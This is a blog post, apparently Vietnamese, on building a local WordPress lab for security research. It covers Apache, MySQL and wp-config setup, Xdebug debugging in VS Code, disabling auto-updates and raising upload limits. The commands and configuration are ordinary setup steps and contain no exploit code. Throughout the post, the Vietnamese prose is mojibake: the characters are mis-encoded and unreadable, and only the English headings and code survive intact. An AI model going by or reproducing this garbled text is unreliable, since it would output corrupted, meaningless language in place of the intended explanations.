Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"}]